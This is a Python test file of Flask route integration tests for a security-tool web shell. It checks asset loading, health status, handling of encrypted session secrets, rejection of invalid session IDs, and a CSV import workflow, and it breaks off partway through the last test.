"""
Integration tests for Flask routes using the test client.
These tests exercise HTTP-level behaviour without starting a real server.
Run with: pytest tests/ (from the repo root)
"""

import errno
import base64
import csv
import hashlib
import io
import json
import logging
import os
import re
import sqlite3
import tempfile
import textwrap
import time
import uuid
import zipfile
from copy import deepcopy

import pytest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any
from urllib.parse import quote, urlencode
import unittest.mock as mock

import app as shell_app
import blueprints.assets as shell_assets
import blueprints.history as history_routes
import blueprints.projects as project_routes
import config
import core.process as process
import services.runs.comparison as run_comparison
import services.secrets.vault as secrets_vault
import services.projects.package_presets as package_presets
import services.atlas.import_workflow as atlas_import_workflow
from services.commands.builtins import execute_builtin_command
from core.output_signals import OutputSignalClassifier
from core.database import DB_PATH, db_connect, db_init
from core.database_backend import DatabaseBackend, quote_sqlite_identifier
from services.runs.output_model import LineEvent, LineRole
from services.projects.contracts import ProjectWorkspaceError
from services.projects.findings import record_run_findings
from services.atlas.materializer import materialize_run_entities
from services.workspace import files as workspace_files
from services.workspace.files import resolve_workspace_path


def _builtin_line_text(line: dict[str, object]) -> str:
    return str(line.get("text", ""))


def _builtin_lines_text(lines: list[dict[str, object]]) -> str:
    return "\n".join(_builtin_line_text(line) for line in lines)


def _ai_assist_count_for_run(run_id: str) -> int:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT COUNT(*) FROM ai_run_assists WHERE run_id = ?", (run_id,)).fetchone()
    return int(row[0] if row else 0)


def _audit_event_rows(*, target_id: str = "", event_type: str = "") -> list[dict[str, Any]]:
    where: list[str] = []
    params: list[str] = []
    if target_id:
        where.append("target_id = ?")
        params.append(target_id)
    if event_type:
        where.append("event_type = ?")
        params.append(event_type)
    where_sql = " WHERE " + " AND ".join(where) if where else ""
    with db_connect() as conn:
        rows = conn.execute(
            "SELECT event_type, target_type, target_id, project_id, job_id, correlation_id, details "
            "FROM audit_events" + where_sql + " ORDER BY created, id",
            params,
        ).fetchall()
    return [
        {
            **{key: row[key] for key in row.keys() if key != "details"},
            "details": json.loads(row["details"] or "{}"),
        }
        for row in rows
    ]


_AUDIT_PRIVATE_EXPORT_STRINGS = (
    "actor_session_hash",
    "actor_session_label",
    "client_ip",
    "destination_session_hash",
    "owner_session_hash",
    "session_hash",
    "source_session_hash",
    "user_agent",
)


def _assert_no_audit_private_export_strings(text: str) -> None:
    for value in _AUDIT_PRIVATE_EXPORT_STRINGS:
        assert value not in text


# ── Fixtures ──────────────────────────────────────────────────────────────────

def get_client(*, use_forwarded_for=True):
    shell_app.app.config["TESTING"] = True
    client = shell_app.app.test_client()
    if use_forwarded_for:
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
    return client


class _RouteFakeProc:
    def __init__(self, pid=4321):
        self.pid = pid
        self.stdout = mock.Mock()


class _CapturedThread:
    instances = []

    def __init__(self, *, target=None, kwargs=None, name="", daemon=None):
        self.target = target
        self.kwargs = kwargs or {}
        self.name = name
        self.daemon = daemon
        self.started = False
        self.__class__.instances.append(self)

    def start(self):
        self.started = True


# ── / ─────────────────────────────────────────────────────────────────────────

class TestIndexRoute:
    @staticmethod
    def _lazy_assets_from_body(body: str) -> dict[str, Any]:
        match = re.search(
            r'<script id="lazy-assets-json" type="application/json">(.+?)</script>',
            body,
            flags=re.S,
        )
        assert match, "missing lazy asset JSON"
        parsed = json.loads(match.group(1))
        assert isinstance(parsed, dict)
        return parsed

    @staticmethod
    def _asset_path_without_version(url: str) -> str:
        return url.split("?", 1)[0]

    @staticmethod
    def _normalize_lazy_asset_entry(entry: Any) -> dict[str, str]:
        if isinstance(entry, str):
            return {"url": entry, "type": "classic"}
        assert isinstance(entry, dict)
        assert isinstance(entry.get("url"), str)
        return {"url": entry["url"], "type": entry.get("type", "classic")}

    def test_returns_200(self):
        client = get_client()
        resp = client.get("/")
        assert resp.status_code == 200
        assert "immutable" not in resp.headers.get("Cache-Control", "")

    def test_returns_html(self):
        client = get_client()
        resp = client.get("/")
        assert b"<!DOCTYPE html>" in resp.data or b"<html" in resp.data.lower()
        body = resp.get_data(as_text=True)
        assert '/static/css/styles.css' not in body
        assert '/static/css/core/base.css?v=' in body
        assert '/static/css/mobile-chrome.css?v=' in body
        assert '/vendor/ansi_up.js?v=' in body
        assert '<script src="/static/js/export_pdf.js?v=' not in body
        assert '"export_pdf": {' in body
        assert '"url": "/static/js/export_pdf.js?v=' in body
        assert '<script src="/static/js/features/atlas/atlas_tabs.js?v=' not in body
        assert '<script src="/static/js/features/atlas/atlas_entity_detail.js?v=' not in body
        assert '<script src="/static/js/features/atlas/atlas_entity_row.js?v=' not in body
        assert '<script src="/static/js/features/atlas/atlas_overlay.js?v=' not in body
        assert '<script src="/static/js/features/atlas/atlas_mobile.js?v=' not in body
        assert '"atlas_tabs": {' in body
        assert '"url": "/static/js/features/atlas/atlas_tabs.js?v=' in body
        assert '"type": "module"' in body
        assert body.count('"type": "module"') >= 3
        assert '"atlas_entity_row": {' in body
        assert '"url": "/static/js/features/atlas/atlas_entity_row.js?v=' in body
        assert '"atlas_entity_detail": {' in body
        assert '"url": "/static/js/features/atlas/atlas_entity_detail.js?v=' in body
        assert '"atlas_overlay": {' in body
        assert '"url": "/static/js/features/atlas/atlas_overlay.js?v=' in body
        assert '"atlas_mobile": {' in body
        assert '"url": "/static/js/features/atlas/atlas_mobile.js?v=' in body
        assert '<script src="/static/js/features/findings/findings_board_modal.js?v=' not in body
        assert '"findings_board": {' in body
        assert '"url": "/static/js/features/findings/findings_board_modal.js?v=' in body
        assert '<script src="/static/js/features/projects/project_activity.js?v=' not in body
        assert '"project_activity": {' in body
        assert '"url": "/static/js/features/projects/project_activity.js?v=' in body
        assert '<script src="/static/js/features/projects/project_artifacts.js?v=' not in body
        assert '"project_artifacts": {' in body
        assert '"url": "/static/js/features/projects/project_artifacts.js?v=' in body
        assert '<script src="/static/js/features/projects/project_workspace_shell.js?v=' not in body
        assert '"project_workspace_shell": {' in body
        assert '"url": "/static/js/features/projects/project_workspace_shell.js?v=' in body
        assert '<script src="/static/js/features/projects/project_workspace_events.js?v=' not in body
        assert '"project_workspace_events": {' in body
        assert '"url": "/static/js/features/projects/project_workspace_events.js?v=' in body
        assert '<script src="/static/js/features/projects/project_entities.js?v=' not in body
        assert '"project_entities": {' in body
        assert '"url": "/static/js/features/projects/project_entities.js?v=' in body
        assert '<script src="/static/js/features/projects/project_packages.js?v=' not in body
        assert '"project_packages": {' in body
        assert '"url": "/static/js/features/projects/project_packages.js?v=' in body
        assert '<script src="/static/js/features/projects/project_report.js?v=' not in body
        assert '"project_report": {' in body
        assert '"url": "/static/js/features/projects/project_report.js?v=' in body
        assert '<script src="/static/js/features/run-comparison/history_compare_renderer.js?v=' not in body
        assert '"history_compare_core": {' in body
        assert '"url": "/static/js/features/run-comparison/history_compare_core.js?v=' in body
        assert '"history_compare_overlay": {' in body
        assert '"url": "/static/js/features/run-comparison/history_compare_overlay.js?v=' in body
        assert '"history_compare_controls": {' in body
        assert '"url": "/static/js/features/run-comparison/history_compare_controls.js?v=' in body
        assert '"history_compare_navigation": {' in body
        assert '"url": "/static/js/features/run-comparison/history_compare_navigation.js?v=' in body
        assert '"history_compare_renderer": {' in body
        assert '"url": "/static/js/features/run-comparison/history_compare_renderer.js?v=' in body
        assert '"history_compare_launcher": {' in body
        assert '"url": "/static/js/features/run-comparison/history_compare_launcher.js?v=' in body
        assert '<script src="/static/js/features/history/history_run_details.js?v=' not in body
        assert '"history_run_details": {' in body
        assert '"url": "/static/js/features/history/history_run_details.js?v=' in body
        assert '<script src="/static/js/features/preferences/teams_panel.js?v=' not in body
        assert '"options_session_token_controls": {' in body
        assert '"url": "/static/js/features/preferences/session_token_controls.js?v=' in body
        assert '"options_secrets_panel": {' in body
        assert '"url": "/static/js/features/preferences/secrets_panel.js?v=' in body
        assert '"options_teams_panel": {' in body
        assert '"url": "/static/js/features/preferences/teams_panel.js?v=' in body
        assert '"options_notification_channels": {' in body
        assert '"url": "/static/js/features/preferences/notification_channels.js?v=' in body
        assert '<script src="/static/js/features/command-registry/command_registry.js?v=' not in body
        assert '"command_registry": {' in body
        assert '"url": "/static/js/features/command-registry/command_registry.js?v=' in body
        assert '<script src="/static/js/features/workflows/workflows.js?v=' not in body
        assert '"workflows": {' in body
        assert '"url": "/static/js/features/workflows/workflows.js?v=' in body
        assert '<script src="/static/js/pty.js?v=' not in body
        assert '"pty_controller": {' in body
        assert '"url": "/static/js/pty.js?v=' in body
        assert '<script src="/static/js/features/schedules/schedules_modal.js?v=' not in body
        assert '"schedules_modal": {' in body
        assert '"url": "/static/js/features/schedules/schedules_modal.js?v=' in body
        assert '<script src="/static/js/features/status-monitor/status_monitor_core.js?v=' not in body
        assert '<script src="/static/js/status_monitor.js?v=' not in body
        assert '"status_monitor_core": {' in body
        assert '"url": "/static/js/features/status-monitor/status_monitor_core.js?v=' in body
        assert '"status_monitor_data": {' in body
        assert '"url": "/static/js/features/status-monitor/status_monitor_data.js?v=' in body
        assert '"status_monitor_resources": {' in body
        assert '"url": "/static/js/features/status-monitor/status_monitor_resources.js?v=' in body
        assert '"status_monitor": {' in body
        assert '"url": "/static/js/status_monitor.js?v=' in body
        assert '<script src="/static/js/features/mobile/mobile_running_indicator.js?v=' not in body
        assert '"mobile_running_indicator": {' in body
        assert '"url": "/static/js/features/mobile/mobile_running_indicator.js?v=' in body
        assert '<script src="/static/js/tour_modal.js?v=' not in body
        assert '"tour_modal": {' in body
        assert '"url": "/static/js/tour_modal.js?v=' in body
        assert '<script src="/static/js/features/watchers/watchers_modal.js?v=' not in body
        assert '"watchers_modal": {' in body
        assert '"url": "/static/js/features/watchers/watchers_modal.js?v=' in body
        assert '<script src="/vendor/jspdf.umd.min.js?v=' not in body
        assert '"jspdf": "/vendor/jspdf.umd.min.js?v=' in body
        assert '<script src="/vendor/xterm.js?v=' not in body
        assert '"xterm_js": "/vendor/xterm.js?v=' in body
        assert '"xterm_fit_js": "/vendor/xterm-addon-fit.js?v=' in body
        assert '"xterm_css": "/vendor/xterm.css?v=' in body
        assert '/static/js/core/run_output_model.js?v=' not in body
        assert '/static/js/core/config.js?v=' not in body
        assert 'type="module" src="/static/js/shell_bootstrap.entry.js?v=' in body
        assert "__darklabBootstrapAsset" in body
        assert "ESM_BOOTSTRAP_LOAD_FAILED" in body
        assert "window.__darklabBootstrapAsset.start('index', 'shell-bootstrap'," in body
        assert (
            "window.__darklabBootstrapAsset.failed('index', 'shell-bootstrap', this.src, event)"
            in body
        )
        assert '/static/js/mobile_chrome.js?v=' not in body

    def test_source_mode_lazy_asset_json_matches_configured_lazy_manifest(self):
        client = get_client()
        body = client.get("/").get_data(as_text=True)
        lazy_assets = self._lazy_assets_from_body(body)
        configured_lazy = json.loads(
            (Path(__file__).resolve().parents[2] / "assets.config.json").read_text(encoding="utf-8")
        )["lazy"]
        normalized_assets = {
            name: self._normalize_lazy_asset_entry(entry)
            for name, entry in lazy_assets.items()
        }
        rendered_paths = {
            name: self._asset_path_without_version(entry["url"])
            for name, entry in normalized_assets.items()
        }
        assert set(rendered_paths.values()) == set(configured_lazy)
        assert len(rendered_paths) == len(configured_lazy)

        for name, entry in normalized_assets.items():
            assert set(entry) == {"url", "type"}
            assert entry["url"].startswith(("/static/js/", "/vendor/"))
            assert "?v=" in entry["url"]
            path = self._asset_path_without_version(entry["url"])
            if path.startswith("/static/js/"):
                assert entry["type"] == "module", name
            else:
                assert entry["type"] == "classic", name

    def test_bundle_mode_renders_built_asset_bundles(self):
        client = get_client()
        manifest = json.loads(shell_app._ASSET_MANIFEST_PATH.read_text(encoding="utf-8"))
        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "bundle"}):
            shell_app._STATIC_ASSET_URL_CACHE.clear()
            body = client.get("/").get_data(as_text=True)
        assert re.search(r'href="/static/build/app\.[a-f0-9]{12}\.css"', body)
        assert re.search(r'type="module" src="/static/build/shell-bootstrap\.[a-f0-9]{12}\.js"', body)
        assert re.search(r'href="/static/build/static-favicon\.[a-f0-9]{12}\.ico"', body)
        assert "window.__darklabBootstrapAsset.start('index', 'shell-bootstrap'," in body
        assert (
            "window.__darklabBootstrapAsset.failed('index', 'shell-bootstrap', this.src, event)"
            in body
        )
        lazy_assets = self._lazy_assets_from_body(body)
        normalized_assets = {
            name: self._normalize_lazy_asset_entry(entry)
            for name, entry in lazy_assets.items()
        }
        configured_lazy = json.loads(
            (Path(__file__).resolve().parents[2] / "assets.config.json").read_text(encoding="utf-8")
        )["lazy"]
        assert {
            entry["url"] for entry in normalized_assets.values()
        } == {
            manifest["static_assets"][source]["path"]
            for source in configured_lazy
        }
        for name, entry in normalized_assets.items():
            assert entry["url"].startswith("/static/build/"), name
            assert "?v=" not in entry["url"], name
        assert manifest["static_assets"]["/vendor/jspdf.umd.min.js"]["path"] in body
        assert manifest["static_assets"]["/vendor/xterm.css"]["path"] in body
        assert manifest["static_assets"]["/vendor/ansi_up.js"]["path"] in body
        assert '/static/css/core/base.css?v=' not in body
        assert '/static/css/mobile-chrome.css?v=' not in body
        assert '/static/js/core/run_output_model.js?v=' not in body
        assert '/static/js/core/config.js?v=' not in body
        assert '/static/js/mobile_chrome.js?v=' not in body
        assert '/vendor/jspdf.umd.min.js?v=' not in body
        assert '/vendor/xterm.css?v=' not in body

    def test_bundle_mode_fails_loud_when_manifest_missing(self, tmp_path, monkeypatch):
        monkeypatch.setattr(shell_app, "_ASSET_MANIFEST_PATH", tmp_path / "manifest.json")
        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "bundle"}):
            with mock.patch.object(shell_app.log, "error") as mock_error:
                with pytest.raises(RuntimeError, match="Run assets:sync"):
                    shell_app._asset_bundle("app")
        mock_error.assert_called_once()
        assert mock_error.call_args[0][0] == "ASSET_MANIFEST_RESOLUTION_FAILED"
        assert mock_error.call_args.kwargs["exc_info"] is True
        extra = mock_error.call_args.kwargs["extra"]
        assert extra["bundle"] == "app"
        assert extra["bundle_type"] == ""
        assert extra["asset_bundle_mode"] == "bundle"
        assert extra["manifest_path"] == str(tmp_path / "manifest.json")

    def test_esm_asset_bundle_uses_module_type_and_source_entries(self, tmp_path, monkeypatch):
        manifest_path = tmp_path / "manifest.json"
        manifest_path.write_text(json.dumps({
            "version": 1,
            "bundles": {
                "module-fixture": {
                    "type": "esm",
                    "path": "/static/build/module-fixture.123456789abc.js",
                    "hash": "123456789abc",
                    "entries": ["/static/js/core/utils.js"],
                    "sources": [
                        "/static/js/core/utils.js",
                        "/static/js/core/output_core.js",
                    ],
                    "source_hashes": {},
                },
            },
            "static_assets": {
                "/vendor/jspdf.umd.min.js": {
                    "path": "/static/build/vendor-jspdf.123456789abc.js",
                    "hash": "123456789abc",
                },
            },
        }), encoding="utf-8")
        monkeypatch.setattr(shell_app, "_ASSET_MANIFEST_PATH", manifest_path)

        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "bundle"}):
            shell_app._STATIC_ASSET_URL_CACHE.clear()
            assert shell_app._asset_bundle("module-fixture") == [
                "/static/build/module-fixture.123456789abc.js"
            ]
            assert shell_app._asset_bundle_script_type("module-fixture") == "module"
            assert shell_app._static_asset_url("/vendor/jspdf.umd.min.js") == (
                "/static/build/vendor-jspdf.123456789abc.js"
            )

        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "source"}):
            sources = shell_app._asset_bundle("module-fixture")
            vendor_url = shell_app._static_asset_url("/vendor/jspdf.umd.min.js")
        assert len(sources) == 1
        assert sources[0].startswith("/static/js/core/utils.js?v=")
        assert vendor_url.startswith("/vendor/jspdf.umd.min.js?v=")

    def test_invalid_asset_bundle_mode_logs_warning_once_and_falls_back(self):
        shell_app._WARNED_INVALID_ASSET_BUNDLE_MODES.clear()
        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "sideways"}):
            with mock.patch.object(shell_app.log, "warning") as mock_warning:
                assert shell_app._asset_bundle_mode() == "bundle"
                assert shell_app._asset_bundle_mode() == "bundle"
        mock_warning.assert_called_once()
        assert mock_warning.call_args[0][0] == "ASSET_BUNDLE_MODE_INVALID"
        assert mock_warning.call_args.kwargs["extra"] == {
            "configured_mode": "sideways",
            "fallback_mode": "bundle",
        }
        shell_app._WARNED_INVALID_ASSET_BUNDLE_MODES.clear()

    def test_asset_bundle_mode_selection_logs_info_once_per_mode(self):
        shell_app._LOGGED_ASSET_BUNDLE_MODES.clear()
        with mock.patch.dict("config.CFG", {"asset_bundle_mode": "source"}):
            with mock.patch.object(shell_app.log, "info") as mock_info:
                assert shell_app._asset_bundle_mode() == "source"
                assert shell_app._asset_bundle_mode() == "source"
        mock_info.assert_called_once()
        assert mock_info.call_args[0][0] == "ASSET_BUNDLE_MODE_SELECTED"
        assert mock_info.call_args.kwargs["extra"] == {"asset_bundle_mode": "source"}
        shell_app._LOGGED_ASSET_BUNDLE_MODES.clear()

    def test_asset_version_fallback_logs_warning(self):
        with mock.patch.object(shell_app.log, "warning") as mock_warning:
            version = shell_app._asset_version("/static/js/does-not-exist.js")
        assert version == shell_app.APP_VERSION
        mock_warning.assert_called_once()
        assert mock_warning.call_args[0][0] == "ASSET_VERSION_FALLBACK"
        assert mock_warning.call_args.kwargs["exc_info"] is True
        extra = mock_warning.call_args.kwargs["extra"]
        assert extra["asset_path"] == "/static/js/does-not-exist.js"
        assert extra["local_path"].endswith("static/js/does-not-exist.js")
        assert extra["fallback_version"] == shell_app.APP_VERSION

    def test_desktop_diag_link_opens_in_new_tab_while_mobile_action_stays_button(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["203.0.113.0/24"]}):
            body = client.get("/").get_data(as_text=True)
        assert 'id="rail-diag-btn"' in body
        assert 'href="/diag"' in body
        assert 'target="_blank"' in body
        assert 'rel="noopener noreferrer"' in body
        assert 'data-menu-action="diag"' in body
        rail_match = re.search(r'<a class="([^"]*)" data-action="diag" id="rail-diag-btn"', body)
        mobile_match = re.search(r'<button type="button" class="([^"]*)" data-menu-action="diag"', body)
        assert rail_match and "u-hidden" not in rail_match.group(1)
        assert mobile_match and "u-hidden" not in mobile_match.group(1)

    def test_bootstrapped_app_config_matches_config_route(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/").get_data(as_text=True)
            config_payload = json.loads(client.get("/config").data)
        match = re.search(
            r'<script id="app-config-json" type="application/json">(.*?)</script>',
            body,
            re.S,
        )
        assert match
        boot_payload = json.loads(match.group(1))
        assert boot_payload == config_payload

# ── /health ───────────────────────────────────────────────────────────────────

class TestHealthRoute:
    def test_returns_200_when_db_ok(self):
        client = get_client()
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_response_is_json(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert "status" in data
        assert "db" in data
        assert "redis" in data

    def test_db_true_when_sqlite_available(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["db"] is True

    def test_redis_null_when_no_redis(self):
        # In the test environment there is no Redis configured
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["redis"] is None

    def test_status_degraded_when_db_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["db"] is False

    def test_status_ok_when_redis_pings_successfully(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["status"] == "ok"
        assert data["redis"] is True

    def test_status_degraded_when_redis_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["redis"] is False


class TestSecretsRoutes:
    def _secret_client(self, monkeypatch, tmp_path):
        key = base64.b64encode(b"b" * 32).decode("ascii")
        monkeypatch.setenv("SECRETS_MASTER_KEY", key)
        monkeypatch.setattr(secrets_vault, "resolve_data_dir", lambda: str(tmp_path))
        secrets_vault.reset_master_key_cache_for_tests()
        db_path = str(tmp_path / "secrets-routes.db")
        lock_path = str(tmp_path / "secrets-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        client = get_client()
        return client, patchers

    def test_session_secrets_crud_never_returns_value(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            headers = {"X-Session-ID": "secrets-route-session"}
            create = client.post(
                "/session/secrets",
                headers=headers,
                json={
                    "name": "shodan_api_key",
                    "value": "super-secret",
                    "consumer_envs": ["SHODAN_API_KEY"],
                },
            )
            assert create.status_code == 201
            created_payload = create.get_json()
            assert created_payload["name"] == "SHODAN_API_KEY"
            assert "value" not in created_payload
            assert "super-secret" not in create.get_data(as_text=True)

            update = client.post(
                "/session/secrets",
                headers=headers,
                json={"name": "SHODAN_API_KEY", "value": "replacement"},
            )
            assert update.status_code == 200

            listed = client.get("/session/secrets", headers=headers)
            assert listed.status_code == 200
            listed_payload = listed.get_json()
            assert listed_payload["secrets"][0]["name"] == "SHODAN_API_KEY"
            assert "replacement" not in listed.get_data(as_text=True)

            rotated = client.post("/session/secrets/rotate", headers=headers)
            assert rotated.status_code == 200
            assert rotated.get_json()["rewrapped"] == 1
            assert "replacement" not in rotated.get_data(as_text=True)

            removed = client.delete("/session/secrets/shodan_api_key", headers=headers)
            assert removed.status_code == 200
            assert removed.get_json()["removed"] is True
            assert client.get("/session/secrets", headers=headers).get_json()["secrets"] == []

            audit_rows = _audit_event_rows(target_id="SHODAN_API_KEY")
            assert [row["event_type"] for row in audit_rows] == [
                "secret.create",
                "secret.update",
                "secret.delete",
            ]
            assert _audit_event_rows(event_type="secret.rotate")[0]["details"]["updated_count"] == 1
            assert "replacement" not in json.dumps(audit_rows)
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_session_secrets_reject_invalid_name(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            resp = client.post(
                "/session/secrets",
                headers={"X-Session-ID": "secrets-invalid-name-session"},
                json={"name": "../token", "value": "secret"},
            )
            assert resp.status_code == 400
            assert resp.get_json()["error"] == "invalid_name"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_session_secrets_require_valid_session_id(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            listed = client.get("/session/secrets")
            assert listed.status_code == 401
            assert listed.get_json()["error"] == "session_required"

            with mock.patch.dict(shell_app.app.config, {"ALLOW_LEGACY_TEST_SESSION_IDS": False}):
                created = client.post(
                    "/session/secrets",
                    headers={"X-Session-ID": "../bad"},
                    json={"name": "SHODAN_API_KEY", "value": "secret"},
                )
                guarded_writes = [
                    client.post("/projects", headers={"X-Session-ID": "../bad"}, json={"name": "Invalid"}),
                    client.post(
                        "/session/preferences",
                        headers={"X-Session-ID": "../bad"},
                        json={"preferences": {"pref_timestamps": True}},
                    ),
                    client.post(
                        "/session/recent-values",
                        headers={"X-Session-ID": "../bad"},
                        json={"values": [{"kind": "domain", "value": "darklab.sh"}]},
                    ),
                    client.post(
                        "/session/starred",
                        headers={"X-Session-ID": "../bad"},
                        json={"command": "nmap darklab.sh"},
                    ),
                    client.post(
                        "/share",
                        headers={"X-Session-ID": "../bad"},
                        json={"run_id": "run-missing"},
                    ),
                    client.post(
                        "/history/bulk-delete",
                        headers={"X-Session-ID": "../bad"},
                        json={"run_ids": ["run-missing"]},
                    ),
                ]
            assert created.status_code == 401
            assert created.get_json()["error"] == "session_required"
            for response in guarded_writes:
                assert response.status_code == 401
                assert response.get_json()["error"] == "session_required"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_session_secrets_reject_duplicate_consumer_env_binding(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            headers = {"X-Session-ID": "secrets-consumer-env-session"}
            first = client.post(
                "/session/secrets",
                headers=headers,
                json={
                    "name": "shodan_primary",
                    "value": "primary-secret",
                    "consumer_envs": ["SHODAN_API_KEY"],
                },
            )
            assert first.status_code == 201

            duplicate = client.post(
                "/session/secrets",
                headers=headers,
                json={
                    "name": "shodan_backup",
                    "value": "backup-secret",
                    "consumer_envs": ["SHODAN_API_KEY"],
                },
            )
            assert duplicate.status_code == 409
            payload = duplicate.get_json()
            assert payload["error"] == "consumer_env_conflict"
            assert payload["env"] == "SHODAN_API_KEY"
            assert payload["existing_name"] == "SHODAN_PRIMARY"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()


class TestAtlasImportRoutes:
    def _client(self, tmp_path):
        db_path = str(tmp_path / "atlas-import-routes.db")
        lock_path = str(tmp_path / "atlas-import-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        return get_client(), patchers

    def _register_session_token(self, session_id):
        with db_connect() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO session_tokens (token, created, last_seen_at) VALUES (?, ?, ?)",
                (session_id, datetime.now(timezone.utc).isoformat(), ""),
            )
            conn.commit()

    def test_preview_and_apply_import_without_creating_history_run(self, tmp_path):
        from services.intel.canonical import entity_signature
        from services.projects.findings import _finding_signature, _normalize_finding_signal_key

        client, patchers = self._client(tmp_path)
        try:
            session_id = "tok_atlas_import_routes"
            self._register_session_token(session_id)
            project_id = "proj_atlas_import_routes"
            archived_project_id = "proj_atlas_import_archived"
            quota_project_id = "proj_atlas_import_quota"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                    "VALUES (?, ?, 'Imported Scope', 'imported-scope', ?, ?)",
                    (project_id, session_id, datetime.now(timezone.utc).isoformat(), datetime.now(timezone.utc).isoformat()),
                )
                conn.execute(
                    "INSERT INTO projects (id, session_id, name, slug, status, created, updated) "
                    "VALUES (?, ?, 'Archived Import Scope', 'archived-import-scope', 'archived', ?, ?)",
                    (
                        archived_project_id,
                        session_id,
                        datetime.now(timezone.utc).isoformat(),
                        datetime.now(timezone.utc).isoformat(),
                    ),
                )
                conn.execute(
                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                    "VALUES (?, ?, 'Quota Import Scope', 'quota-import-scope', ?, ?)",
                    (
                        quota_project_id,
                        session_id,
                        datetime.now(timezone.utc).isoformat(),
                        datetime.now(timezone.utc).isoformat(),
                    ),
                )
                conn.commit()
            csv_payload = (
                "row_type,entity_kind,entity_value,title,severity,evidence,external_id\n"
                "entity,domain,imported.example,,,,ent-1\n"
                "entity,domain,IMPORTED.example,,,,ent-2\n"
                "finding,domain,imported.example,Imported TLS finding,high,certificate mismatch,ext-1\n"
            ).encode()
            with mock.patch.object(atlas_import_workflow.log, "info") as mock_import_log:
                preview = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "generic_csv",
                        "source_tool": "External CSV",
                        "import_name": "Quarterly triage",
                        "file": (io.BytesIO(csv_payload), "triage.csv"),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
            assert preview.status_code == 200
            preview_payload = preview.get_json()
            assert preview_payload["counts"]["entity_new"] == 1
            assert preview_payload["counts"]["finding_new"] == 1
            assert preview_payload["counts"]["project_target_candidates"] == 1
            assert preview_payload["apply_options"]["import_findings"]["available"] is True
            assert preview_payload["apply_options"]["create_project_targets"]["available"] is True
            preview_success_extra = next(
                call.kwargs["extra"]
                for call in mock_import_log.call_args_list
                if call.args[0] == "ATLAS_IMPORT_PREVIEW_SUCCEEDED"
            )
            assert preview_success_extra["session"].startswith("tok_atla")
            assert preview_success_extra["session"].endswith("********")
            assert preview_success_extra["format_id"] == "generic_csv"
            assert preview_success_extra["source_tool_key"] == "external_csv"
            assert preview_success_extra["draft_id"] == preview_payload["draft_id"]
            assert preview_success_extra["entity_new"] == 1
            assert preview_success_extra["finding_new"] == 1
            preview_created_extra = next(
                call.kwargs["extra"]
                for call in mock_import_log.call_args_list
                if call.args[0] == "ATLAS_IMPORT_PREVIEW_CREATED"
            )
            assert preview_created_extra["session"].startswith("tok_atla")
            assert preview_created_extra["session"].endswith("********")
            assert preview_created_extra["source_tool_key"] == "external_csv"
            assert "source_tool" not in preview_created_extra
            assert preview_created_extra["has_filename"] is True
            assert preview_created_extra["upload_bytes"] == len(csv_payload)
            assert preview_created_extra["entity_new"] == 1
            assert preview_created_extra["finding_new"] == 1

            with mock.patch.object(atlas_import_workflow.log, "info") as mock_apply_log:
                archived_rejected = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview_payload["draft_id"],
                        "row_set_digest": preview_payload["row_set_digest"],
                        "project_id": archived_project_id,
                        "options": {"import_findings": True, "create_project_targets": True},
                    },
                )
                assert archived_rejected.status_code == 404
                assert archived_rejected.get_json()["error"] == "project_not_found"

                applied = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview_payload["draft_id"],
                        "row_set_digest": preview_payload["row_set_digest"],
                        "project_id": project_id,
                        "options": {"import_findings": True, "link_to_project": True, "create_project_targets": True},
                    },
                )
